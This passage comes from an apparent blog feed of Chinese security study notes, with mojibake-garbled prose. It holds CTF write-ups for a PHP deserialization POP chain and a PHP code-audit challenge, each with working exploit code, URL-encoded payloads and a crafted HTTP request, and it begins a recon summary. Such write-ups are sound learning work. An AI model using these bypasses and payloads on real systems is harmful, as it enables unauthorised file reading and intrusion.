<h2 id="ååºåˆ—åŒ–æ¼æ´æŒ–æ˜"><a href="#ååºåˆ—åŒ–æ¼æ´æŒ–æ˜" class="headerlink" title="ååºåˆ—åŒ–æ¼æ´æŒ–æ˜"></a>ååºåˆ—åŒ–æ¼æ´æŒ–æ˜</h2><p>ååºåˆ—åŒ–æ¼æ´çš„æŒ–æ˜ä¸»è¦æ˜¯åœ¨ä»£ç ä¸­æ‰¾åˆ°å¯ä»¥åˆ©ç”¨çš„POPç»„ä»¶ï¼Œå…·ä½“æ€è·¯ï¼š<br>åˆ©ç”¨æ–‡æœ¬æœç´¢å·¥å…·ï¼Œåœ¨ç›®æ ‡ä»£ç ä¸­æœç´¢ï¼Œ<strong><strong>wakeupï¼Œ</strong>destruct</strong>è¿™ç±»é­”æœ¯æ–¹æ³•</p>
<p>è·Ÿè¸ªæ–¹æ³•ï¼Œçœ‹é­”æœ¯æ–¹æ³•ä¸­æ˜¯å¦å­˜åœ¨ä¸€äº›å¯ä»¥åˆ©ç”¨çš„åœ°æ–¹ï¼Œæ‰¾åˆ°å¯ä»¥åˆ©ç”¨çš„POPç»„ä»¶</p>
<p>æ ¹æ®ç±»çš„ç»“æ„å®šä¹‰æ„å»ºåºåˆ—åŒ–å­—ç¬¦ä¸²Poc</p>
<hr>
<h2 id="å›å½’ä¸»é¢˜"><a href="#å›å½’ä¸»é¢˜" class="headerlink" title="å›å½’ä¸»é¢˜"></a>å›å½’ä¸»é¢˜</h2><p>å‰é¢æ‰¯çš„æœ‰ç‚¹å¤šï¼Œæºç è‡ªå·±ç¼–è¾‘å™¨æ‰“å¼€çœ‹å§</p>
<p>é¦–å…ˆï¼Œæˆ‘ä»¬å‘ç°åªè¦æ»¡è¶³</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$this-&gt;nice-&gt;aaa &#x3D;&#x3D;&#x3D; $this-&gt;nice-&gt;bbb</span><br></pre></td></tr></table></figure></div>
<p>å³å¯è¯»æ–‡ä»¶<br><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g8965g86ykj30vj0mxdiz.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g8965g86ykj30vj0mxdiz.jpg" class="lazyload" title="test"></a></p>
<p>åˆ©ç”¨popé“¾ï¼Œæ„é€ </p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div></div><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span> </span></span><br><span class="line"><span class="function">    </span>&#123;          </span><br><span class="line">        <span class="keyword">$this</span>-&gt;skyobj = <span class="keyword">new</span> cool;   </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span>      </span></span><br><span class="line"><span class="function">    </span>&#123;          </span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;skyobj))  </span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;skyobj-&gt;read();      </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></div>
<p>åŒæ—¶æ³¨æ„åˆ°<br><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g8965g515zj30sk097402.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g8965g515zj30sk097402.jpg" class="lazyload" title="test"></a></p>
<p>æ„é€ å‡ºå¦‚ä¸‹åºåˆ—åŒ–</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;*O:4:&quot;baby&quot;:3:&#123;s:9:&quot;*skyobj&quot;;O:4:&quot;cool&quot;:3:&#123;s:8:&quot;filename&quot;;N;s:4:&quot;nice&quot;;N;s:6:&quot;amzing&quot;;N;&#125;s:3:&quot;aaa&quot;;N;s:3:&quot;bbb&quot;;R:6;&#125;</span><br><span class="line">è½¬ç å¾—åˆ°</span><br><span class="line">O%3A4%3A%22baby%22%3A3%3A%7Bs%3A9%3A%22%00%2A%00skyobj%22%3BO%3A4%3A%22cool%22%3A3%3A%7Bs%3A8%3A%22filename%22%3BN%3Bs%3A4%3A%22nice%22%3BN%3Bs%3A6%3A%22amzing%22%3BN%3B%7Ds%3A3%3A%22aaa%22%3BN%3Bs%3A3%3A%22bbb%22%3BR%3A6%3B%7D</span><br></pre></td></tr></table></figure></div>

<h3 id="å®Œæ•´exp"><a href="#å®Œæ•´exp" class="headerlink" title="å®Œæ•´exp"></a>å®Œæ•´exp</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php  </span><br><span class="line">class baby </span><br><span class="line">&#123;   </span><br><span class="line">    protected $skyobj;    </span><br><span class="line">    public $aaa;</span><br><span class="line">    public $bbb;</span><br><span class="line">    function __construct() </span><br><span class="line">    &#123;          </span><br><span class="line">        $this-&gt;skyobj &#x3D; new cool;   </span><br><span class="line">    &#125;  </span><br><span class="line">    function __toString()      </span><br><span class="line">    &#123;          </span><br><span class="line">        if (isset($this-&gt;skyobj))  </span><br><span class="line">        &#123;</span><br><span class="line">            return $this-&gt;skyobj-&gt;read();      </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line">class cool </span><br><span class="line">&#123;    </span><br><span class="line">    public $filename&#x3D;&#39;.&#x2F;flag.php&#39;;     </span><br><span class="line">    public $nice;</span><br><span class="line">    public $amzing&#x3D;&#39;O%3A4%3A%22baby%22%3A3%3A%7Bs%3A9%3A%22%00%2A%00skyobj%22%3BO%3A4%3A%22cool%22%3A3%3A%7Bs%3A8%3A%22filename%22%3BN%3Bs%3A4%3A%22nice%22%3BN%3Bs%3A6%3A%22amzing%22%3BN%3B%7Ds%3A3%3A%22aaa%22%3BN%3Bs%3A3%3A%22bbb%22%3BR%3A6%3B%7D&#39;; </span><br><span class="line">    &#x2F;*O:4:&quot;baby&quot;:3:&#123;s:9:&quot;*skyobj&quot;;O:4:&quot;cool&quot;:3:&#123;s:8:&quot;filename&quot;;N;s:4:&quot;nice&quot;;N;s:6:&quot;amzing&quot;;N;&#125;s:3:&quot;aaa&quot;;N;s:3:&quot;bbb&quot;;R:6;&#125;*&#x2F;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$a &#x3D; new baby();</span><br><span class="line">&#x2F;&#x2F; $a-&gt;bbb &#x3D;&amp;$a-&gt;aaa;</span><br><span class="line">echo urlencode(serialize($a));</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></div>

<p>å¾—åˆ° payloadï¼š</p>
<pre><code>O%3A4%3A%22baby%22%3A3%3A%7Bs%3A9%3A%22%00%2A%00skyobj%22%3BO%3A4%3A%22cool%22%3A3%3A%7Bs%3A8%3A%22filename%22%3Bs%3A10%3A%22.%2Fflag.php%22%3Bs%3A4%3A%22nice%22%3BN%3Bs%3A6%3A%22amzing%22%3Bs%3A227%3A%22O%253A4%253A%2522baby%2522%253A3%253A%257Bs%253A9%253A%2522%2500%252A%2500skyobj%2522%253BO%253A4%253A%2522cool%2522%253A3%253A%257Bs%253A8%253A%2522filename%2522%253BN%253Bs%253A4%253A%2522nice%2522%253BN%253Bs%253A6%253A%2522amzing%2522%253BN%253B%257Ds%253A3%253A%2522aaa%2522%253BN%253Bs%253A3%253A%2522bbb%2522%253BR%253A6%253B%257D%22%3B%7Ds%3A3%3A%22aaa%22%3BN%3Bs%3A3%3A%22bbb%22%3BN%3B%7D</code></pre><p>æäº¤å¾—åˆ° flag<br><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g8965g2vijj30mf02cjra.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g8965g2vijj30mf02cjra.jpg" class="lazyload" title="test"></a></p>
<p>popé“¾çš„æ„é€ ï¼Œä¸ä»…ä»…æ˜¯æ ¹æ®phpé­”æœ¯æ–¹æ³•çš„æ¼æ´ï¼Œåœ¨æ‰§è¡Œæ¼æ´expï¼Œå‡½æ•°è°ƒç”¨è¿‡ç¨‹ä¸­ï¼Œå¯èƒ½æ˜¯åœ¨ä¸€ä¸ªç±»çš„æ™®é€šæ–¹æ³•ä¸­ã€‚è¿™æ—¶å€™å¯ä»¥é€šè¿‡å¯»æ‰¾ç›¸åŒçš„å‡½æ•°åå°†ç±»çš„å±æ€§å’Œæ•æ„Ÿå‡½æ•°çš„å±æ€§è”ç³»èµ·æ¥ã€‚</p>
<p><a href="https://www.anquanke.com/post/id/170681" target="_blank" rel="noopener">PHPååºåˆ—åŒ–å…¥é—¨ä¹‹å¯»æ‰¾POPé“¾(ä¸€)</a><br><a href="https://www.t00ls.net/articles-44787.html" target="_blank" rel="noopener">PHPååºåˆ—åŒ–æ¼æ´ä¸Webshell</a></p>
]]></content>
      <categories>
        <category>å­¦ä¹ ç¬”è®°</category>
      </categories>
      <tags>
        <tag>writeup</tag>
        <tag>php</tag>
      </tags>
  </entry>
  <entry>
    <title>è´´è´´æ ¡èµ›ä»£ç å®¡è®¡é¢˜çš„æ€»ç»“å­¦ä¹ </title>
    <url>/yakko117/2019/09/26/ccsu_codeaudit/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\yakko117\assets\css\APlayer.min.css"><script src="\yakko117\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\yakko117\assets\js\Meting.min.js"></script><h1 id="Code-Easy-Audit"><a href="#Code-Easy-Audit" class="headerlink" title="Code_Easy_Audit"></a>Code_Easy_Audit</h1><p>é¦–å…ˆçœ‹æºç å§</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div></div><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">echo</span>Â <span class="string">"NullÂ Â Â Â Â Â Â Â Â Â ...Â Â Â Â Â Â Â Â Â Â Â Â NullÂ Â Â Â Â Â Â Â Â Â Â Â ...Â Â Â Â Â Â Â Â Â Â Â Â NullÂ Â Â Â Â Â Â Â Â Â ...Â Â "</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'src'</span>]))Â &#123;</span><br><span class="line">Â Â Â Â <span class="keyword">die</span>(highlight_file(<span class="string">'index.php'</span>,Â <span class="keyword">true</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>($_REQUEST)&#123;</span><br><span class="line">Â Â Â Â <span class="keyword">foreach</span>Â ($_REQUESTÂ asÂ $keyÂ =&gt;Â $value)Â &#123;</span><br><span class="line">Â Â Â Â Â Â Â Â <span class="keyword">if</span>(preg_match(<span class="string">'/[a-zA-Z]/i'</span>,Â $value))Â Â Â <span class="keyword">die</span>(<span class="string">'HelloÂ Hack.'</span>);</span><br><span class="line">Â Â Â Â &#125;</span><br><span class="line">&#125;</span><br><span class="line">Â </span><br><span class="line"><span class="keyword">if</span>($_SERVER)&#123;</span><br><span class="line">Â Â Â Â <span class="keyword">if</span>(preg_match(<span class="string">'/cyber|flag|ciscn/i'</span>,Â $_SERVER[<span class="string">'QUERY_STRING'</span>]))Â Â <span class="keyword">die</span>(<span class="string">'HelloÂ Hack..'</span>);</span><br><span class="line">&#125;</span><br><span class="line">Â </span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'cyber'</span>]))&#123;</span><br><span class="line">Â Â Â Â <span class="keyword">if</span>(!(substr($_GET[<span class="string">'cyber'</span>],Â <span class="number">32</span>)Â ===Â md5($_GET[<span class="string">'cyber'</span>])))&#123;Â </span><br><span class="line">Â Â Â Â Â Â Â Â <span class="keyword">die</span>(<span class="string">'HelloÂ Hack...'</span>);</span><br><span class="line">Â Â Â Â &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">Â Â Â Â Â Â Â Â <span class="keyword">if</span>(preg_match(<span class="string">'/^ciscnsec$/'</span>,Â $_GET[<span class="string">'ciscn'</span>])Â &amp;&amp;Â $_GET[<span class="string">'ciscn'</span>]Â !==Â <span class="string">'ciscnsec'</span>)&#123;</span><br><span class="line">Â Â Â Â Â Â Â Â Â Â Â Â $getflagÂ =Â file_get_contents($_GET[<span class="string">'flag'</span>]);</span><br><span class="line">Â Â Â Â Â Â Â Â &#125;<span class="keyword">else</span></span><br><span class="line">Â Â Â Â <span class="keyword">die</span>(<span class="string">'HelloÂ Hack....'</span>);</span><br><span class="line">Â Â Â Â Â Â Â Â <span class="keyword">if</span>(<span class="keyword">isset</span>($getflag)Â &amp;&amp;Â $getflagÂ ===Â <span class="string">'security'</span>)&#123;</span><br><span class="line">Â Â Â Â Â Â Â Â Â Â Â Â <span class="keyword">include</span>Â <span class="string">'flag.php'</span>;</span><br><span class="line">Â Â Â Â Â Â Â Â Â Â Â Â <span class="keyword">echo</span>Â $flag;</span><br><span class="line">Â Â Â Â Â Â Â Â &#125;<span class="keyword">else</span>Â <span class="keyword">die</span>(<span class="string">'HelloÂ Hack.....'</span>);</span><br><span class="line">Â Â Â Â &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>

<p>è¿™é¢˜è€ƒå‡ ä¸ªç‚¹ï¼š</p>
<ol>
<li><code>$_REQUEST</code> çš„å˜é‡è¦†ç›–</li>
<li>ç¼–ç ç»•è¿‡</li>
<li>PHPæ•°ç»„ç‰¹æ€§</li>
<li>æ­£åˆ™ç»•è¿‡</li>
<li><code>file_get_contents</code> å‡½æ•°</li>
</ol>
<hr>
<h2 id="å…·ä½“åˆ†æ"><a href="#å…·ä½“åˆ†æ" class="headerlink" title="å…·ä½“åˆ†æ"></a>å…·ä½“åˆ†æ</h2><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div></div><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>($_REQUEST)&#123;</span><br><span class="line">Â Â Â Â <span class="keyword">foreach</span>Â ($_REQUESTÂ asÂ $keyÂ =&gt;Â $value)Â &#123;</span><br><span class="line">Â Â Â Â Â Â Â Â <span class="keyword">if</span>(preg_match(<span class="string">'/[a-zA-Z]/i'</span>,Â $value))Â Â Â <span class="keyword">die</span>(<span class="string">'HelloÂ Hack.'</span>);</span><br><span class="line">Â Â Â Â &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p> ä¸Šè¿°ä»£ç æŠŠ <code>$_GET</code>, <code>$_POST</code>, <code>$_COOKIE</code>ä¼ è¿›æ¥çš„å€¼è¿›è¡Œäº†æ­£åˆ™åŒ¹é…ï¼Œå¦‚æœåŒ…å«äº†<code>A-Z</code> å’Œ <code>a-z</code>çš„å­—æ¯å°±è¢«waf</p>
<p>è¿™é‡Œçš„ <code>$_REQUEST</code>æœ‰ä¸€ä¸ªç‰¹æ€§ï¼Œå°±æ˜¯å½“ <code>GET</code> å’Œ <code>POST</code> éƒ½å­˜åœ¨åŒä¸€ä¸ªå˜é‡åçš„æ—¶å€™ï¼Œåªè·å– <code>POST</code> ä¸­çš„å€¼ï¼Œæ‰€ä»¥å¯ä»¥é€šè¿‡è¿™ä¸ªç‰¹æ€§æ¥ç»•è¿‡æ­£åˆ™çš„åŒ¹é…</p>
<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g7d7qdve9vj31570g240l.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g7d7qdve9vj31570g240l.jpg" class="lazyload" title="test"></a></p>
<p>å½“POSTä¸­ä¹Ÿæœ‰ä¸ªå˜é‡çš„æ—¶å€™ï¼Œabcå°±ä¼šè¾“å‡ºï¼Œå¦åˆ™å°±è¾“å‡ºwaf</p>
<hr>
<p>æ¥ç€å¾€ä¸‹åˆ†æ</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div></div><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>($_SERVER)&#123;</span><br><span class="line">Â Â Â Â <span class="keyword">if</span>(preg_match(<span class="string">'/cyber|flag|ciscn/i'</span>,Â $_SERVER[<span class="string">'QUERY_STRING'</span>]))Â Â <span class="keyword">die</span>(<span class="string">'HelloÂ Hack..'</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>å…³äº <code>$_SERVER[&#39;QUERY_STRING&#39;]</code> è·å–çš„å€¼ï¼Œå°±æ˜¯getä¸­å˜é‡åå’Œå†…å®¹</p>
<p>è¯¦ç»†èµ„æ–™å¯ä»¥å‚è€ƒ<a href="https://blog.csdn.net/fjb2080/article/details/80548431" target="_blank" rel="noopener">ä¸€ç¯‡CSDNè¯¦è§£</a><br>è¿™ä¸ªç»•è¿‡æ€è·¯å°±æ˜¯ <code>URLç¼–ç </code><br><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g7d7qdvcfwj30z70mf411.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g7d7qdvcfwj30z70mf411.jpg" class="lazyload" title="test"></a></p>
<hr>
<p>ç„¶åå°±æ˜¯ä¸‹é¢çš„ä»£ç </p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div></div><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'cyber'</span>]))&#123;</span><br><span class="line">Â Â Â Â <span class="keyword">if</span>(!(substr($_GET[<span class="string">'cyber'</span>],Â <span class="number">32</span>)Â ===Â md5($_GET[<span class="string">'cyber'</span>])))&#123;Â </span><br><span class="line">Â Â Â Â Â Â Â Â <span class="keyword">die</span>(<span class="string">'HelloÂ Hack...'</span>);</span><br><span class="line">Â Â Â Â &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">Â Â Â Â Â Â Â Â <span class="keyword">if</span>(preg_match(<span class="string">'/^ciscnsec$/'</span>,Â $_GET[<span class="string">'ciscn'</span>])Â &amp;&amp;Â $_GET[<span class="string">'ciscn'</span>]Â !==Â <span class="string">'ciscnsec'</span>)&#123;</span><br><span class="line">Â Â Â Â Â Â Â Â Â Â Â Â $getflagÂ =Â file_get_contents($_GET[<span class="string">'flag'</span>]);</span><br><span class="line">Â Â Â Â Â Â Â Â &#125;<span class="keyword">else</span></span><br><span class="line">Â Â Â Â <span class="keyword">die</span>(<span class="string">'HelloÂ Hack....'</span>);</span><br><span class="line">Â Â Â Â Â Â Â Â <span class="keyword">if</span>(<span class="keyword">isset</span>($getflag)Â &amp;&amp;Â $getflagÂ ===Â <span class="string">'security'</span>)&#123;</span><br><span class="line">Â Â Â Â Â Â Â Â Â Â Â Â <span class="keyword">include</span>Â <span class="string">'flag.php'</span>;</span><br><span class="line">Â Â Â Â Â Â Â Â Â Â Â Â <span class="keyword">echo</span>Â $flag;</span><br><span class="line">Â Â Â Â Â Â Â Â &#125;<span class="keyword">else</span>Â <span class="keyword">die</span>(<span class="string">'HelloÂ Hack.....'</span>);</span><br><span class="line">Â Â Â Â &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p> ä¸€ä¸ªç®€å•çš„ MD5 ç»•è¿‡<br> <code>if(!(substr($_GET[&#39;cyber&#39;], 32) === md5($_GET[&#39;cyber&#39;])))</code><br> è¿™é‡Œçš„ç»•è¿‡æ€è·¯å¾ˆç®€å•ï¼Œä¼ è¿›å»æ˜¯ä¸ªæ•°ç»„çš„æ—¶å€™ï¼Œå€¼å°±ä¸ºç©ºï¼Œè‡ªç„¶å°±ç›¸ç­‰äº†</p>
<p> ç„¶åæ˜¯<br> <code>if(preg_match(&#39;/^ciscnsec$/&#39;, $_GET[&#39;ciscn&#39;]) &amp;&amp; $_GET[&#39;ciscn&#39;] !== &#39;ciscnsec&#39;)</code><br> preg_match()å‡½æ•°æ²¡æœ‰è§„å®šå¼€å¤´ï¼Œciscn=ciscnsec ï¼ˆURLåŠ å¯†ï¼‰</p>
<p> file_get_contents å‡½æ•°<br><code>if(isset($getflag) &amp;&amp; $getflag === &#39;security&#39;)</code><br>ç”¨åˆ°phpä¼ªåè®®<br>flag=data://text/plain,security<br>å®˜æ–¹ç»™çš„wpé‡Œçœ‹äº†ä¸€ä¸‹ï¼Œç„¶åçœ‹äº†ä¸€ä¸‹<a href="https://www.php.net/manual/zh/wrappers.data.php" target="_blank" rel="noopener">phpæ‰‹å†Œ</a></p>
<p>æœ€åç»„åˆå°±æ˜¯</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang"></div></div><figure class="highlight"><table><tr><td class="code"><pre><span class="line">cyber[]&amp;ciscn=ciscnsec&amp;flag=data://text/plain,security</span><br><span class="line"><span class="attribute">URLç¼–ç å¦‚ä¸‹</span></span><br><span class="line">/?%63%79%62%65%72%5b%5d&amp;%63%69%73%63%6e=%63%69%73%63%6e%73%65%63%0a&amp;%66%6c%61%67=%64%61%74%61%3a%2f%2f%74%65%78%74%2f%70%6c%61%69%6e%2c%73%65%63%75%72%69%74%79 </span><br><span class="line"></span><br><span class="line">//æ”¾åˆ°BPé‡Œè·‘ä¸€éï¼Œå°±è¿”å›flag</span><br><span class="line"></span><br><span class="line"><span class="keyword">POST</span> <span class="string">/?%63%79%62%65%72%5b%5d&amp;%63%69%73%63%6e=%63%69%73%63%6e%73%65%63%0a&amp;%66%6c%61%67=%64%61%74%61%3a%2f%2f%74%65%78%74%2f%70%6c%61%69%6e%2c%73%65%63%75%72%69%74%79</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: localhost:8080</span><br><span class="line"><span class="attribute">User-Agent</span>: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:56.0) Gecko/20100101 Firefox/56.0</span><br><span class="line"><span class="attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line"><span class="attribute">Accept-Language</span>: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3</span><br><span class="line"><span class="attribute">Accept-Encoding</span>: gzip, deflate</span><br><span class="line"><span class="attribute">Content-Type</span>: application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span>: 22</span><br><span class="line"><span class="attribute">Connection</span>: close</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span>: 1</span><br><span class="line"></span><br><span class="line">ciscn=777&amp;flag=777</span><br></pre></td></tr></table></figure></div>]]></content>
      <categories>
        <category>å­¦ä¹ ç¬”è®°</category>
      </categories>
      <tags>
        <tag>writeup</tag>
        <tag>code audit</tag>
      </tags>
  </entry>
  <entry>
    <title>æ¸—é€æ€»ç»“å­¦ä¹ ç¬”è®°ï¼ˆè¯¯</title>
    <url>/yakko117/2019/09/12/%E6%B8%97%E9%80%8F%E6%80%BB%E7%BB%93/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\yakko117\assets\css\APlayer.min.css"><script src="\yakko117\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\yakko117\assets\js\Meting.min.js"></script><p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQly1g6wz572tahj31hc0u0qpx.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQly1g6wz572tahj31hc0u0qpx.jpg" class="lazyload" title="test"></a></p>
<p>çœæŠ¤ç½‘åå¤©çš„æ‘¸é±¼ç»“æŸäº†ï¼Œç„¶åæ‹–åˆ°ç°åœ¨æ‰å¼€å§‹å†™æ€»ç»“</p>
<a id="more"></a>
<h1 id="èµ„äº§æ”¶é›†"><a href="#èµ„äº§æ”¶é›†" class="headerlink" title="èµ„äº§æ”¶é›†"></a>èµ„äº§æ”¶é›†</h1><p>å‡ ä¹å æ®æ¸—é€è¿‡ç¨‹çš„70%-80%ã€‚<br>èµ„äº§æ”¶é›†æ€è·¯å¦‚ä¸‹ï¼š<br>ä¸»ç«™ â€“&gt; ï¼ˆçœŸå®IPï¼‰ â€“&gt; å­ç«™/æ—ç«™/Cæ®µ â€“&gt; æ•æ„Ÿä¿¡æ¯æ”¶é›† â€“&gt; ç›®æ ‡ç³»ç»Ÿåå°</p>
<h2 id="ä¸»åŸŸåä¿¡æ¯"><a href="#ä¸»åŸŸåä¿¡æ¯" class="headerlink" title="ä¸»åŸŸåä¿¡æ¯"></a>ä¸»åŸŸåä¿¡æ¯</h2><h3 id="WhoisæŸ¥è¯¢"><a href="#WhoisæŸ¥è¯¢" class="headerlink" title="WhoisæŸ¥è¯¢"></a>WhoisæŸ¥è¯¢</h3><p>kali å¯ç›´æ¥è¿›è¡Œ <code>whois</code>æŸ¥è¯¢</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">root@kali:~# whois baidu.com</span><br><span class="line"> </span><br><span class="line">Whois Server Version 2.0</span><br><span class="line"> </span><br><span class="line">Domain names in the .com and .net domains can now be registered</span><br><span class="line">with many different competing registrars. Go to http:&#x2F;&#x2F;www.internic.net</span><br><span class="line">for detailed information.</span><br><span class="line"></span><br><span class="line">Domain Name: baidu.com</span><br><span class="line">Registry Domain ID: 11181110_DOMAIN_COM-VRSN</span><br><span class="line">Registrar WHOIS Server: whois.markmonitor.com</span><br><span class="line">Registrar URL: http:&#x2F;&#x2F;www.markmonitor.com</span><br><span class="line">Updated Date: 2019-05-08T20:59:33-0700</span><br><span class="line">Creation Date: 1999-10-11T04:05:17-0700</span><br><span class="line">Registrar Registration Expiration Date: 2026-10-11T00:00:00-0700</span><br><span class="line">Registrar: MarkMonitor, Inc.</span><br><span class="line">Registrar IANA ID: 292</span><br><span class="line">Registrar Abuse Contact Email: email@markmonitor.com</span><br><span class="line">Registrar Abuse Contact Phone: +1.2083895740</span><br><span class="line">Domain Status: clientUpdateProhibited (https:&#x2F;&#x2F;www.icann.org&#x2F;epp#clientUpdateProhibited)</span><br><span class="line">Domain Status: clientTransferProhibited (https:&#x2F;&#x2F;www.icann.org&#x2F;epp#clientTransferProhibited)</span><br><span class="line">Domain Status: clientDeleteProhibited (https:&#x2F;&#x2F;www.icann.org&#x2F;epp#clientDeleteProhibited)</span><br><span class="line">Domain Status: serverUpdateProhibited (https:&#x2F;&#x2F;www.icann.org&#x2F;epp#serverUpdateProhibited)</span><br><span class="line">Domain Status: serverTransferProhibited (https:&#x2F;&#x2F;www.icann.org&#x2F;epp#serverTransferProhibited)</span><br><span class="line">Domain Status: serverDeleteProhibited (https:&#x2F;&#x2F;www.icann.org&#x2F;epp#serverDeleteProhibited)</span><br><span class="line">Registrant Organization: Beijing Baidu Netcom Science Technology Co., Ltd.</span><br><span class="line">Registrant State&#x2F;Province: Beijing</span><br><span class="line">Registrant Country: CN</span><br><span class="line">Admin Organization: Beijing Baidu Netcom Science Technology Co., Ltd.</span><br><span class="line">Admin State&#x2F;Province: Beijing</span><br><span class="line">Admin Country: CN</span><br><span class="line">Tech Organization: Beijing Baidu Netcom Science Technology Co., Ltd.</span><br><span class="line">Tech State&#x2F;Province: Beijing</span><br><span class="line">Tech Country: CN</span><br><span class="line">Name Server: ns4.baidu.com</span><br><span class="line">Name Server: ns2.baidu.com</span><br><span class="line">Name Server: ns1.baidu.com</span><br><span class="line">Name Server: ns3.baidu.com</span><br><span class="line">Name Server: ns7.baidu.com</span><br><span class="line">DNSSEC: unsigned</span><br><span class="line">URL of the ICANN WHOIS Data Problem Reporting System: http:&#x2F;&#x2F;wdprs.internic.net&#x2F;</span><br><span class="line">&gt;&gt;&gt; Last update of WHOIS database: 2019-09-07T14:24:11-0700 &lt;&lt;&lt;</span><br><span class="line"></span><br><span class="line">For more information on WHOIS status codes, please visit:</span><br><span class="line">  https:&#x2F;&#x2F;www.icann.org&#x2F;resources&#x2F;pages&#x2F;epp-status-codes</span><br><span class="line"></span><br><span class="line">If you wish to contact this domainâ€™s Registrant, Administrative, or Technical</span><br><span class="line">contact, and such email address is not visible above, you may do so via our web</span><br><span class="line">form, pursuant to ICANNâ€™s Temporary Specification. To verify that you are not a</span><br><span class="line">robot, please enter your email address to receive a link to a page that</span><br><span class="line">facilitates email communication with the relevant 